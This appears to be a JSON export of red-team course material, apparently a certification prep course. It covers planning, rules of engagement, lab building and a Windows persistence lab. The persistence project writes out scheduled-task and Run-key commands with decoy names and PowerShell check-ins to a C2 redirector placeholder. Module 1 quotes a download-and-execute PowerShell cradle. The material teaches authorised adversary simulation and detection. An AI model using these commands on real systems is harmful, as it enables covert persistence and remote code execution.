Method:</strong> Select <em>one</em> of the following for implementation:</p>\n<ul>\n<li><strong>Option A (Recommended): Scheduled Task (<code>schtasks.exe</code> or PowerShell)</strong> - Flexible, can run at boot or logon, can hide window.</li>\n<li><strong>Option B: Run Registry Key (<code>reg.exe</code>)</strong> - Simple, common, runs on logon.</li>\n<li><em>(You can experiment with others later, but master one first).</em></li>\n</ul>\n</li>\n<li><p><strong>Prepare Your Payload/Command:</strong></p>\n<ul>\n<li>What command will your persistence mechanism run? It needs to do something that signals back to you.</li>\n<li><strong>Simple Example Command:</strong> A PowerShell script that downloads and executes your Module 4 payload from your Module 3 web server. Or even simpler, a command that just attempts to <code>curl</code> or <code>Invoke-WebRequest</code> a specific URL on your C2 redirector (e.g., <code>powershell -command &quot;Invoke-WebRequest -Uri http://your_redirector_ip/checkin -UseBasicParsing&quot;</code>). This &quot;checkin&quot; request will show up in your redirector logs and potentially Sysmon network logs.</li>\n<li>Save this command or script to a location on the target VM (e.g., <code>C:\\Users\\Public\\checkin.ps1</code> or <code>C:\\Windows\\Temp\\runme.cmd</code>). Make sure the file name and path are somewhat plausible.</li>\n</ul>\n</li>\n<li><p><strong>Implement the Persistence:</strong> Execute the necessary command on the target Windows client VM to set up your chosen persistence method. You can do this by:</p>\n<ul>\n<li><p>Using the access gained in Module 5 (if your C2 framework allows executing commands).</p>\n</li>\n<li><p>Manually opening a command prompt or PowerShell window on the target VM (simulating having initial access).</p>\n</li>\n<li><p><strong>If Option A (Scheduled Task):</strong></p>\n<ul>\n<li><em>Using <code>schtasks.exe</code>:</em><pre><code class=\"language-cmd\">REM Example: Run a PowerShell script at logon\nschtasks /create /tn &quot;SystemHealthCheck&quot; /tr &quot;powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\checkin.ps1&quot; /sc ONLOGON /ru %USERNAME% /f\n</code></pre>\n<em>Choose a better task name and path for OpSec!</em></li>\n<li><em>Using PowerShell:</em><pre><code class=\"language-powershell\"># Example: Run a command at system startup\n$Action = New-ScheduledTaskAction -Execute &#39;powershell.exe&#39; -Argument &#39;-command &quot;Invoke-WebRequest -Uri http://your_redirector_ip/startup_check -UseBasicParsing&quot;&#39;\n$Trigger = New-ScheduledTaskTrigger -AtStartup\nRegister-ScheduledTask -TaskName &quot;ServiceMonitor&quot; -Action $Action -Trigger $Trigger -Description &quot;Monitors background services.&quot;\n</code></pre>\n<em>Replace <code>your_redirector_ip</code> with your actual IP/domain.</em></li>\n</ul>\n</li>\n<li><p><strong>If Option B (Run Registry Key):</strong></p>\n<ul>\n<li><em>Using <code>reg.exe</code>:</em><pre><code class=\"language-cmd\">REM Example: Run a script via cmd.exe on logon\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v &quot;TemporaryFilesCleanup&quot; /t REG_SZ /d &quot;cmd.exe /c C:\\Users\\Public\\checkin.cmd&quot; /f\n</code></pre>\n<em>Or point directly to a <code>.exe</code> or <code>.vbs</code> script.</em></li>\n<li><em>Using PowerShell:</em><pre><code class=\"language-bash\"># Example: Add a Run key pointing to your payload\n$RunKey = &quot;HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;\n$ValueName = &quot;BackgroundSync&quot;\n$Command = &quot;C:\\Users\\Public\\my_payload.exe&quot; # Or powershell.exe -File ...\nNew-ItemProperty -Path $RunKey -Name $ValueName -Value $Command -PropertyType String -Force\n</code></pre>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Verify Setup (Optional but Recommended):</strong> Before rebooting, check if your persistence mechanism was successfully created.</p>\n<ul>\n<li>For Scheduled Task: Open <code>taskschd.msc</code> or run <code>schtasks /query</code> in command prompt. Look for your task name.</li>\n<li>For Run Key: Open <code>regedit.exe</code> and navigate to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>. Look for your value name.</li>\n</ul>\n</li>\n<li><p><strong>Reboot the Target VM:</strong> This is the crucial test! Restart your Windows client VM.</p>\n</li>\n<li><p><strong>Check for Callback/Execution:</strong></p>\n<ul>\n<li>After the VM reboots and you log in (if using ONLOGON) or it boots up (if using ONSTART/AtStartup), check your C2 framework or your redirector&#39;s logs (Apache/Nginx access logs) to see if the expected connection or request occurred.</li>\n<li>If your payload has a visual indicator (like launching calc.exe), look for that (though stealthy payloads won&#39;t).</li>\n</ul>\n</li>\n<li><p><strong>Analyze the Logs in Your SIEM:</strong> Now, switch hats to the defender! Go to your Splunk or ELK instance (Module 2) and search for activity related to the persistence you just implemented.</p>\n<ul>\n<li><strong>Search for the creation:</strong> Look for the command you used (<code>schtasks.exe</code>, <code>reg.exe</code>, <code>powershell.exe</code>) setting up the persistence. Look for Security Event ID 4698 (Task Created) or Sysmon Event ID 12/13/14 (Registry modifications).</li>\n<li><strong>Search for the execution:</strong> After the reboot, look for the process specified in your persistence mechanism (e.g., <code>powershell.exe</code>, <code>cmd.exe</code>, your payload <code>.exe</code>). Look for Sysmon Event ID 1 (Process Creation). Pay attention to the parent process (e.g., <code>explorer.exe</code> for Run keys/Startup, <code>svchost.exe</code> for Scheduled Tasks running as SYSTEM, <code>winlogon.exe</code> for RunOnce).</li>\n<li><strong>Search for the network connection:</strong> Look for Sysmon Event ID 3 (Network Connection) originating from the executed process, connecting to your C2 redirector&#39;s IP/port.</li>\n<li><strong>Analyze the command line:</strong> Examine the full command line arguments logged (Sysmon Event ID 1 or Security Event ID 4688 with command line logging) to see what your persistence executed. Could a defender spot this command line?</li>\n</ul>\n</li>\n</ol>\n<p><strong>Reflection:</strong></p>\n<ul>\n<li>Did your persistence method work? Did you get a callback after reboot?</li>\n<li>How visible was the setup of the persistence mechanism in the logs?</li>\n<li>How visible was the execution of the persisted command/payload in the logs?</li>\n<li>What log events were most useful in identifying the activity?</li>\n<li>What could you change (OpSec) to make this persistence method harder to detect based on your log analysis?</li>\n</ul>\n<p><em>This project is a direct contribution to your Capstone, demonstrating your ability to establish persistence, integrate it with your C2, and analyze the defensive visibility.</em></p>\n<hr>\n<h3>Summary</h3>\n<p>Fantastic work, team! You&#39;ve now learned the <em>why</em> and <em>how</em> of persistence – making sure your hard-won initial access isn&#39;t fleeting. We explored common locations like Startup folders, Run keys, and Scheduled Tasks, and touched on others. Crucially, we discussed the OpSec needed to make these techniques stealthier and, through the project, you&#39;ve had hands-on experience implementing one and analyzing its visibility in your lab&#39;s logging infrastructure.</p>\n<p>You&#39;ve successfully added another critical layer to your adversary simulation toolkit. You can now get in, execute code, achieve a callback, think about not getting caught immediately, and <em>make sure you can come back later</em>.</p>\n<p>This wraps up the &quot;Adversary Simulation Foundations&quot; section. You&#39;ve built the mindset, the lab, the C2 comms, the payload delivery, the initial execution pipeline, basic evasion concepts, and now, the ability to persist. This is your functional model of the initial access and foothold phase. Give yourselves a pat on the back – that&#39;s a significant achievement!</p>\n<p>Next up, we&#39;ll start looking at what adversaries do <em>after</em> they have a foothold, diving into discovery and lateral movement. But first, make sure you&#39;re comfortable with these foundational pieces. Practice them, break them, fix them, and analyze them in your lab logs. This foundation is everything.</p>\n<p>Onward!</p>\n\n                </div>\n             </div>\n         "
  },
  "sidebarOverview": "\n         <div class=\"card course-progress-card\">\n             <h3>Course Progress</h3>\n             <!-- Progress bar placeholder -->\n             <div class=\"progress-bar-container\">\n                 <div class=\"progress-bar\" style=\"width: 0%;\"></div>\n             </div>\n             <p>0% Complete</p>\n             <p>0/8 modules completed</p>\n             <button>Continue Learning</button>\n         </div>\n         <div class=\"card\">\n             <h3>What You'll Learn</h3>\n             <div class=\"markdown-content text-center\"> <p>Coming Soon</p>\n </div> <!-- Placeholder Coming Soon -->\n         </div>\n         <div class=\"card\">\n             <h3>Requirements</h3>\n              <div class=\"markdown-content text-center\"> <p>Coming Soon</p>\n </div> <!-- Placeholder Coming Soon -->\n         </div>\n     ",
  "rawModules": [
    {
      "title": "module_1",
      "description": "module_1 Overview",
      "order": 1,
      "content": "Alright team, settle in! It's awesome to see everyone ready to dive into the foundational stuff. Module 1 isn't about slinging commands just yet; it's about building the *brain* behind the operation. We're going to understand *why* we do what we do, *who* we're trying to simulate, and *how* to structure our efforts so they're effective, safe, and legal. This mindset shift is non-negotiable for moving beyond simple vulnerability scanning and into the world of realistic adversary simulation.\r\n\r\nThink of it like this: You wouldn't start building a complex RF circuit without understanding the principles of electromagnetism, or write advanced AI without understanding the underlying math. Similarly, we won't jump into C2 and payloads without understanding the *planning* and *purpose* that drives a real adversary simulation.\r\n\r\nLet's get started on building that crucial foundation!\r\n\r\n---\r\n\r\n# CRTO Prep Part 1: Adversary Simulation Foundations\r\n\r\n## Module 1: The Adversary Simulation Mindset & Planning\r\n\r\n**Module Objective:** By the end of this module, learners will be able to articulate the differences between Red Teaming, Penetration Testing, and Threat Emulation, understand the key phases of an adversary simulation engagement, and begin drafting an engagement plan based on threat intelligence.\r\n\r\n---\r\n\r\n### Welcome to the Planning Room\r\n\r\nThis module is your introduction to the strategic side of offensive security. We're putting on our attacker hats, but first, we need to think like military strategists. Planning is paramount. A well-planned simulation is effective, stays within bounds, and provides maximum value to the client (or yourself, in a lab setting).\r\n\r\n### Essential Subtopics: Deep Dive\r\n\r\nLet's break down each key concept we need to master in this module.\r\n\r\n#### 1.1 Defining Red Teaming vs. Penetration Testing vs. Threat Emulation\r\n\r\nThis is often confusing, so let's draw a clear line. They all involve offensive techniques, but their *goals*, *scope*, and *methodologies* differ significantly.\r\n\r\n*   **Penetration Testing (PT):**\r\n    *   **Goal:** Find *as many vulnerabilities as possible* within a defined scope. Think comprehensive vulnerability identification and exploitation.\r\n    *   **Scope:** Typically narrow and well-defined (e.g., specific applications, IP ranges, network segments). Often focuses on known weaknesses (N-day vulns) or misconfigurations.\r\n    *   **Methodology:** Often follows a structured, repeatable process (like OWASP for web apps, NIST guides). Can involve automated scanning alongside manual testing. Speed and breadth over stealth.\r\n    *   **Outcome:** A report listing identified vulnerabilities, their severity, impact, and recommended remediation steps.\r\n    *   **Analogy:** A building inspector looking for structural faults, electrical hazards, plumbing leaks, etc., in specific areas.\r\n\r\n*   **Red Teaming (RT):**\r\n    *   **Goal:** Test the *detection and response capabilities* of the organization (the \"Blue Team\"). Simulate a *realistic* adversary's attempt to achieve specific, high-value objectives. It's about measuring the effectiveness of the security program as a whole, not just finding technical bugs.\r\n    *   **Scope:** Broader than PT, often simulating paths to critical assets or \"crown jewels\" (e.g., domain controllers, sensitive databases, critical business systems). Focuses on getting *in* and moving *laterally* while avoiding detection.\r\n    *   **Methodology:** Emulates realistic adversary Tactics, Techniques, and Procedures (TTPs). Highly manual and stealth-focused. May use novel techniques (0-days, custom malware) if simulating advanced threats, but often relies on blending in using common techniques. Success is measured by achieving objectives and the *defender's response*.\r\n    *   **Outcome:** A report detailing how objectives were achieved, which actions were detected (and how quickly/effectively), which were missed, and recommendations for improving detection, response, and prevention strategies.\r\n    *   **Analogy:** A simulated break-in by skilled thieves trying to steal specific valuable items, testing the alarms, guards, cameras, and police response.\r\n\r\n*   **Threat Emulation (TE):**\r\n    *   **Goal:** Simulate the specific TTPs of a *known, identified threat actor* (e.g., APT29, FIN7). Test defenses against a specific, relevant adversary profile.\r\n    *   **Scope:** Defined by the observed activities and targets of the specific threat actor being emulated.\r\n    *   **Methodology:** Strictly follows the documented TTPs of the chosen threat actor. This requires detailed threat intelligence. It's a *subset* of Red Teaming focused on fidelity to a specific adversary.\r\n    *   **Outcome:** A report assessing how well the organization's defenses performed against the specific TTPs of the emulated threat actor, highlighting gaps relevant to that adversary.\r\n    *   **Analogy:** Role-playing as a specific, known criminal gang with their documented methods and targets to see if the security system can stop *that particular group*.\r\n\r\n**How this relates to CRTO:** The CRTO exam, and this course, sit firmly in the **Red Teaming** and **Threat Emulation** space. We're learning to think and operate like adversaries – focusing on achieving objectives, moving stealthily, using common TTPs (LOLBAS, standard persistence), and understanding how our actions look from a defender's perspective (logging, monitoring). We're not just finding vulns; we're simulating the *chain* of events an attacker would use.\r\n\r\n#### 1.2 Why Adversary Simulation? Understanding the Value Proposition\r\n\r\nOkay, so why bother with this complex simulation stuff when you could just run Nessus or Qualys?\r\n\r\n*   **Tests the Entire Security Program:** PT finds technical flaws. AdvSim tests *people, process, and technology* together. Can the SOC detect sophisticated phishing? Can the IR team respond effectively to a lateral movement attempt?\r\n*   **Measures Real Risk:** Does a vulnerability *actually* matter if the Blue Team catches the attacker trying to exploit it immediately? Can an attacker *chain* seemingly low-risk issues to achieve a high-impact objective? AdvSim answers these questions.\r\n*   **Validates Security Investments:** Did that expensive new EDR or threat intelligence feed make a difference? AdvSim provides concrete evidence of effectiveness (or lack thereof).\r\n*   **Trains the Blue Team:** A well-executed simulation is a high-fidelity training exercise for defenders, showing them what real attacks look like in their environment.\r\n*   **Prioritizes Remediation:** Instead of a flat list of vulns, AdvSim highlights the paths an attacker *can* take to hit critical assets, helping the organization focus remediation efforts where they matter most.\r\n\r\nIn short, adversary simulation provides a *realistic* assessment of an organization's defensive posture against determined human attackers, which is something automated tools and traditional PT often miss.\r\n\r\n#### 1.3 Key Phases of an Adversary Simulation Engagement\r\n\r\nWhile methodologies vary (like the Cyber Kill Chain or unified kill chain), a typical adversary simulation follows a logical flow, mirroring real-world attacks. Understanding these phases helps structure our planning and execution.\r\n\r\n1.  **Intelligence Gathering (Reconnaissance):**\r\n    *   **Adversary Goal:** Learn about the target environment, find potential entry points, identify key personnel or systems, understand defenses.\r\n    *   **Simulation Action:** Passive and active reconnaissance (OSINT, network scanning, identifying technologies, finding credentials/leaks). This informs subsequent phases.\r\n    *   *Think:* What information would a real attacker gather before attacking *this specific* target?\r\n\r\n2.  **Infrastructure:**\r\n    *   **Adversary Goal:** Set up the command and control (C2) and delivery infrastructure needed for the operation.\r\n    *   **Simulation Action:** Deploying servers, configuring redirectors, setting up domains/IPs, choosing C2 frameworks. OpSec is critical here.\r\n    *   *Think:* How will our implants communicate? How will we deliver payloads? How do we hide our tracks? (This is a major focus of Modules 2 & 3!)\r\n\r\n3.  **Initial Access:**\r\n    *   **Adversary Goal:** Get the first foothold inside the target network.\r\n    *   **Simulation Action:** Executing the chosen initial access vector (phishing, exploiting a perimeter vulnerability, physical access, supply chain).\r\n    *   *Think:* How do we get our code to run on a machine inside the network? (Module 4 & 5!)\r\n\r\n4.  **Execution:**\r\n    *   **Adversary Goal:** Run malicious code on the target system.\r\n    *   **Simulation Action:** Using techniques like LOLBAS, scripting, malicious documents, etc., to execute the payload delivered during Initial Access.\r\n    *   *Think:* How do we run our implant or code without being caught? (Module 5 & 6!)\r\n\r\n5.  **Persistence:**\r\n    *   **Adversary Goal:** Maintain access to the compromised system even after reboots, patching, or credential changes.\r\n    *   **Simulation Action:** Implementing mechanisms like scheduled tasks, registry run keys, services, etc., to ensure the implant restarts or can be easily re-executed.\r\n    *   *Think:* How do we make sure we don't lose access once we're in? (Module 8!)\r\n\r\n6.  **Lateral Movement:**\r\n    *   **Adversary Goal:** Move from the initial compromised system to other systems within the network to reach objectives.\r\n    *   **Simulation Action:** Using techniques like Pass-the-Hash/Ticket, exploiting services, abusing administrative tools (PsExec, WinRM), RDP, etc.\r\n    *   *Think:* We're on one machine, how do we get to the Domain Controller or the Finance server?\r\n\r\n7.  **Collection:**\r\n    *   **Adversary Goal:** Gather sensitive data relevant to the objectives from compromised systems.\r\n    *   **Simulation Action:** Locating files, dumping credentials, accessing databases, taking screenshots, keylogging.\r\n    *   *Think:* Where is the data we need? How do we get it?\r\n\r\n8.  **Exfiltration:**\r\n    *   **Adversary Goal:** Get the collected data out of the target network without detection.\r\n    *   **Simulation Action:** Using various protocols (HTTP/S, DNS, FTP), encrypted channels, or trusted third-party services to transfer data out.\r\n    *   *Think:* We have the data, how do we sneak it out?\r\n\r\n9.  **Impact (Optional/Simulated):**\r\n    *   **Adversary Goal:** Achieve the final, high-impact objective (e.g., deploy ransomware, disrupt operations, modify critical data).\r\n    *   **Simulation Action:** Often *simulated* in RT/TE (e.g., placing a \"flag\" file, demonstrating the *ability* to encrypt files without actually doing it). *Never* perform actual destructive actions without explicit, *extremely* rare permission.\r\n    *   *Think:* How would a real attacker achieve their ultimate goal? Can we demonstrate that capability safely?\r\n\r\n10. **Clean-up:**\r\n    *   **Adversary Goal:** Remove tools, logs, and persistence mechanisms to hinder detection and incident response.\r\n    *   **Simulation Action:** Deleting files, clearing logs (carefully, as this is often a detection opportunity for Blue Team), removing persistence.\r\n    *   *Think:* How do we cover our tracks?\r\n\r\n**Mapping to this Course:** This \"Adversary Simulation Foundations\" part of the CRTO prep focuses heavily on phases **1 (Planning informed by Intel), 2 (Infrastructure), 3 (Initial Access), 4 (Execution), 5 (Persistence),** and introduces concepts relevant to **6 (Lateral Movement - execution methods)** and **7 (Collection - execution methods)** through the lens of initial compromise techniques. We'll build the capability to execute these early phases effectively and stealthily.\r\n\r\n#### 1.4 Engagement Design: Setting Realistic Objectives (Flags) and Scope\r\n\r\nBefore touching *any* keyboard for offensive actions, you *must* define:\r\n\r\n*   **Objectives (\"Flags\"):** What are the concrete goals of the simulation? These should be challenging but achievable within the scope and timeframe. Examples:\r\n    *   Obtain Domain Administrator credentials.\r\n    *   Access a specific sensitive database server.\r\n    *   Simulate the exfiltration of a dummy \"confidential\" file from a particular file share.\r\n    *   Establish persistence on at least 3 workstations.\r\n    *   These flags define success and guide your TTP selection.\r\n\r\n*   **Scope:** This defines the playing field.\r\n    *   **In-Scope:** What systems, IP ranges, applications, user groups are valid targets? Be specific.\r\n    *   **Out-of-Scope:** What is absolutely off-limits? Production systems, critical infrastructure, executives' personal devices, specific user accounts, *any* activity that could cause disruption (unless explicitly agreed upon - *highly* rare).\r\n    *   **Allowed Activities:** Phishing? Physical access? Social engineering? Network scanning?\r\n    *   **Disallowed Activities:** Denial of Service (DoS)? Any activity causing system instability? Accessing specific sensitive data (like real PII)?\r\n    *   Defining scope protects *you* and the *client*. Violating scope is a surefire way to end an engagement (and potentially your career).\r\n\r\n#### 1.5 Rules of Engagement (ROE): Defining Boundaries and \"Get Out of Jail Free\" cards\r\n\r\nThe ROE is the formal contract outlining the terms of the simulation. It's legally binding and your ultimate protection. Key elements:\r\n\r\n*   **Dates and Times:** When does the test start and end? Are there specific windows for certain activities (e.g., no phishing on weekends)?\r\n*   **Scope (reiterated):** Formal documentation of in/out scope.\r\n*   **Communication Channels:** How will the Red Team and Blue Team/Point of Contact (POC) communicate? (e.g., dedicated chat, phone numbers). Who is the primary POC?\r\n*   **Emergency Contact / \"Get Out of Jail Free\" (GOJFF):** A clear procedure and contact person/number to immediately stop the test if something goes wrong (e.g., you hit a production system, cause unexpected disruption, or the Blue Team detects and responds in a way that requires communication). *This is critical for safety.*\r\n*   **Whitecarding:** Sometimes, specific Red Team IPs or activities are \"whitecarded\" or ignored by certain security tools or teams to allow testing of *other* layers. The ROE defines this.\r\n*   **Legal & Ethical Clauses:** Confirmation of permission, data handling requirements, non-disclosure agreements.\r\n\r\n**In our lab:** While we don't have a formal client ROE, we *will* define our own \"lab ROE.\" What are the target systems? What are the flags we want to capture? What activities are we simulating (e.g., no actual data exfiltration, just simulate capability)? This self-discipline is crucial.\r\n\r\n#### 1.6 Threat Actor Profiling: Using MITRE ATT&CK, OSINT, and Incident Reports to Understand TTPs\r\n\r\nThis is where we get specific about *who* we're simulating. Even if not emulating a *specific* named group, understanding common attacker behaviors makes our simulation realistic.\r\n\r\n*   **MITRE ATT&CK:** This is your bible for understanding adversary behavior.\r\n    *   It organizes TTPs into **Tactics** (the *why* - e.g., Persistence, Lateral Movement, Exfiltration) and **Techniques** (the *how* - e.g., T1053 - Scheduled Task, T1059 - Command and Scripting Interpreter).\r\n    *   Techniques often have **Sub-techniques** (e.g., T1059.001 - PowerShell, T1059.003 - Windows Command Shell).\r\n    *   It also lists **Groups** (specific threat actors) and **Software** they use, often linking them to specific Techniques.\r\n    *   **How to Use It:** Browse the matrix, read the descriptions for techniques relevant to the phases you're simulating (Initial Access, Execution, Persistence are key for this course). Look at the \"Detection\" and \"Mitigation\" sections for each technique – this informs how the Blue Team might see you and how you might evade them. Look at the \"Procedure Examples\" to see how tools or commands implement the technique.\r\n\r\n*   **OSINT & Incident Reports:** Real-world breaches documented by security researchers, government agencies, or news outlets provide invaluable insights into current attacker TTPs.\r\n    *   Look for reports from CISA, Mandiant, CrowdStrike, Microsoft Threat Intelligence, etc.\r\n    *   Pay attention to the *initial access vector*, the *tools* they used, the *persistence methods*, and *how* they moved laterally.\r\n    *   **Example:** A report on a ransomware group might detail they gained initial access via a vulnerable RDP server (T1021.007), executed a PowerShell stager (T1059.001), established persistence via a Run key (T1547.001), and used PsExec (T1021.006) for lateral movement.\r\n\r\n#### 1.7 Translating TTPs into Simulation Actions\r\n\r\nThis is the critical step that bridges planning to execution. You take the TTPs identified through threat intelligence and map them to concrete actions in your simulation.\r\n\r\n*   **Example TTP (from ATT&CK):** T1053.005 - Scheduled Task\r\n    *   **Description:** Adversaries may abuse the Windows Task Scheduler to execute programs at startup or at scheduled intervals.\r\n    *   **Procedure Examples:** `schtasks.exe /create /tn \"MyTask\" /tr \"C:\\Path\\To\\My\\Payload.exe\" /sc ONLOGON /RL HIGHEST`, using PowerShell `Register-ScheduledTask`.\r\n    *   **Simulation Action:** In Module 8, we will *literally* use `schtasks.exe` or PowerShell to create a task on our target VM that executes our implant, simulating this exact TTP.\r\n\r\n*   **Example TTP:** T1059.001 - PowerShell\r\n    *   **Description:** Adversaries may abuse PowerShell commands and scripts for execution.\r\n    *   **Procedure Examples:** `powershell.exe -c \"[Net.WebClient]::new().DownloadString('http://<C2_SERVER>/script.ps1') | IEX\"`.\r\n    *   **Simulation Action:** In Module 5, we will use `powershell.exe` on the target VM to download and execute a script hosted on our C2 infrastructure, simulating this TTP.\r\n\r\nThis translation is key. ATT&CK and threat reports tell you *what* attackers do. Your technical skills (coding, scripting, using tools) and this course teach you *how* to do it in a controlled environment.\r\n\r\n#### 1.8 Legal and Ethical Considerations in Adversary Simulation\r\n\r\nThis is non-negotiable and paramount.\r\n\r\n*   **Always Have Permission:** Never, *ever* perform offensive activities on systems you do not explicitly have written permission to test. In a lab environment, *you* are granting yourself permission on systems you own or control.\r\n*   **Stay in Scope:** Adhere strictly to the defined scope and disallowed activities in the ROE (or your lab plan).\r\n*   **Understand Data Handling:** If you access any real data (especially PII/PHI/PCI), know the rules for handling it. Ideally, avoid accessing or exfiltrating real sensitive data in simulations unless absolutely necessary and explicitly permitted with strict controls.\r\n*   **Minimize Disruption:** Adversary simulation aims to be realistic but should avoid causing actual harm or significant disruption to business operations. This is where the GOJFF and careful planning come in.\r\n*   **Be Prepared to Stop:** If the GOJFF criteria are met, stop immediately and follow the communication protocol.\r\n*   **Understand Local Laws:** Be aware of cybercrime laws in your jurisdiction and the target's jurisdiction.\r\n\r\n**In our lab:** We control the environment, which simplifies things immensely. However, the discipline of defining scope, objectives, and \"rules\" (like not attacking systems outside our lab network) is a habit you *must* build.\r\n\r\n---\r\n\r\n### Suggested Resources or Prerequisites\r\n\r\nTo get the most out of this module:\r\n\r\n*   **Basic Cybersecurity Concepts:** You should know what a vulnerability, exploit, malware, firewall, and antivirus are at a high level.\r\n*   **Cyber Kill Chain or MITRE ATT&CK:** We've introduced ATT&CK here, but spend some time exploring it. It's fundamental.\r\n*   **Reading:** If you have access, books like \"Red Team Operations\" by Joe Vest and Kirk Hayes are excellent foundational texts. Even just reading the introductions and planning chapters is valuable.\r\n*   **Online:**\r\n    *   **MITRE ATT&CK Website:** Go explore it! `attack.mitre.org`. Click around, read technique descriptions, look at groups.\r\n    *   **LOLBAS Project:** `lolbas-project.github.io`. This catalog of Living Off The Land Binaries and Scripts is incredibly useful for finding execution and defense evasion techniques.\r\n    *   **OSINT Sources:** Follow cybersecurity news, read breach analyses from reputable firms.\r\n\r\n*   **Case Study:** Let's quickly analyze a case study to tie this together.\r\n\r\n#### Case Study Analysis: Initial Access & Infrastructure in Major Breaches\r\n\r\nConsider the SolarWinds breach (often attributed to APT29/Cozy Bear) or the Colonial Pipeline ransomware attack (DarkSide).\r\n\r\n*   **SolarWinds:**\r\n    *   **Initial Access:** Supply Chain Compromise (T1195.002). Malicious code injected into a legitimate software update (SolarWinds Orion). This is a highly sophisticated technique.\r\n    *   **Execution:** The malicious update deployed a backdoor (SUNBURST). This backdoor then executed further code (T1059) and communicated with C2 infrastructure (T1071.001 - Web Protocols).\r\n    *   **Infrastructure:** The C2 infrastructure used techniques like Domain Fronting (T1090.004 - conceptual link) and blended in with legitimate SolarWinds update traffic. They used compromised infrastructure and cloud services.\r\n    *   **Simulation Relevance:** While simulating a supply chain compromise is hard, we can simulate the *effects*: delivering a backdoor payload onto a system (like the Orion server) and having it communicate with our C2 using realistic protocols and potentially evasion techniques that mimic blending in (like using HTTPS, common user agents). We can then simulate the subsequent steps the attackers took *after* gaining that initial foothold.\r\n\r\n*   **Colonial Pipeline (DarkSide):**\r\n    *   **Initial Access:** Reports suggest a compromised VPN credential (T1199 - Trusted Relationship, T1078 - Valid Accounts). A much simpler, common technique.\r\n    *   **Execution:** Once inside, they likely used standard tools and scripting (T1059) to execute ransomware payloads (Simulated Impact).\r\n    *   **Infrastructure:** Used standard C2 (likely HTTP/S) for initial access tools and separate infrastructure for ransomware communication/payment.\r\n    *   **Simulation Relevance:** Simulating compromised credentials for initial access is highly realistic and achievable in a lab (e.g., using default credentials, password spraying against a simulated VPN). We can then simulate the execution of a payload *after* authenticating, rather than just via unauthenticated exploit.\r\n\r\n**Discussion:** How do these real-world examples inform our simulation planning? They show us *common vectors* (compromised credentials, supply chain, exploiting perimeter apps), *common execution methods* (scripting, LOLBAS), and the *importance of infrastructure* that blends in. When we draft our plan, we'll pick initial access vectors and TTPs that are relevant and achievable, perhaps inspired by these or other reports.\r\n\r\n---\r\n\r\n### Module Project/Exercise\r\n\r\nTime to put on our thinking caps and start building the foundation of our plan.\r\n\r\n#### Exercise 1.1: Concept Mapping\r\n\r\n**Objective:** Clearly differentiate the core concepts of Penetration Testing, Red Teaming, and Threat Emulation.\r\n\r\n**Task:** Create a diagram, table, or detailed written summary (your choice of format) that compares and contrasts Penetration Testing, Red Teaming, and Threat Emulation based on the following criteria:\r\n\r\n1.  **Primary Goal:** What is the main objective?\r\n2.  **Scope:** How is the scope typically defined?\r\n3.  **Methodology:** What are the typical approaches and priorities (e.g., breadth vs. depth, stealth vs. speed)?\r\n4.  **Outcome/Report Focus:** What is the main deliverable and its focus?\r\n5.  **Analogy (Optional but Recommended):** Use a non-cyber analogy to explain the difference.\r\n\r\n**Why this is important:** Having a crystal-clear understanding of these terms is fundamental. You'll see them used (and sometimes misused) constantly in the industry. For CRTO, knowing you're operating in the \"Red Team/Threat Emulation\" mindset guides your approach.\r\n\r\n#### Project 1.2: Basic Engagement Plan Draft\r\n\r\n**Objective:** Begin the process of planning an adversary simulation by drafting the initial sections of an engagement plan based on a hypothetical scenario and threat intelligence.\r\n\r\n**Hypothetical Scenario:** You are tasked with simulating a threat actor group (let's call them \"APT-LabRat\") targeting a small, internal corporate network. APT-LabRat is known for gaining initial access primarily through phishing emails containing malicious attachments (like weaponized documents or HTA files) and establishing persistence using standard Windows features like Scheduled Tasks or Run keys. Their objective is typically to gain access to administrative credentials.\r\n\r\n**Task:** Draft a *high-level* engagement plan outline based on this scenario, including the following sections:\r\n\r\n1.  **Engagement Objective(s):** What is the main goal(s) for *your* simulation based on the scenario? (e.g., \"Obtain credentials for a Domain Administrator account in the lab domain\"). Define at least one clear objective.\r\n2.  **In-Scope Assets (Conceptual):** Based on the scenario (small internal network), what *types* of assets are you targeting? (e.g., user workstations, a domain controller, maybe a file server). You don't need specific IPs yet, just roles.\r\n3.  **Out-of-Scope Activities:** What activities are you explicitly *not* going to perform in this lab simulation? (e.g., actual data theft, causing disruption, attacking systems outside the lab network).\r\n4.  **Key T"
    },
    {
      "title": "module_2",
      "description": "module_2 Overview",
      "order": 2,
      "content": "Alright team, let's dive deep into the engine room! Module 1 set the stage, giving us the *why* and the *what* of adversary simulation. Now, in Module 2, we build the *where*. This isn't just setting up some virtual machines; this is constructing our own little world, a safe sandbox where we can unleash simulated threats and, critically, *observe* how they behave and how defenses react. Think of this lab as your personal training ground, your dojo for detection and response analysis from the attacker's perspective. We're building the foundation that the rest of the course stands on. Let's get our hands dirty!\r\n\r\n---\r\n\r\n## CRTO Prep Part 1: Adversary Simulation Foundations\r\n\r\n### Module 2: Building Your Adversary Simulation Lab\r\n\r\n*   **Module Objective:** By the end of this module, learners will be able to deploy and configure a hybrid lab environment including Active Directory, target workstations, and foundational monitoring tools necessary to observe adversary simulation activities.\r\n\r\n---\r\n\r\nWelcome back! Before we can simulate adversaries, we need a place to do it safely and effectively. This module is dedicated to setting up a controlled environment that mirrors typical enterprise networks, allowing us to practice techniques and, crucially, see how they look to defenders.\r\n\r\n#### 2.1 Lab Environment Design: Why a Lab is Crucial\r\n\r\nWhy bother building a dedicated lab?\r\n*   **Safety:** You absolutely *never* want to practice offensive techniques on production systems (unless explicitly authorized in a scope). A lab provides a contained space.\r\n*   **Control:** You control every aspect of the environment – the operating systems, the network configuration, the security tools (or lack thereof). This allows for focused testing.\r\n*   **Visibility:** By controlling the environment, you can deploy and configure logging and monitoring tools to gain deep insight into *exactly* what happens when you execute a technique. This is paramount for understanding detection.\r\n*   **Repeatability:** You can snapshot your environment, revert to a clean state, and repeat tests endlessly.\r\n\r\n**Choosing Your Platform:**\r\n\r\nYou have options for hosting your virtual lab. The most common are:\r\n\r\n*   **VMware Workstation Pro/Fusion:** Excellent performance, features like linked clones and snapshots are robust. Requires a license.\r\n*   **VirtualBox:** Free and open-source. Good for basic setups, snapshots work well. Performance can sometimes be less than VMware.\r\n*   **Hyper-V:** Built into 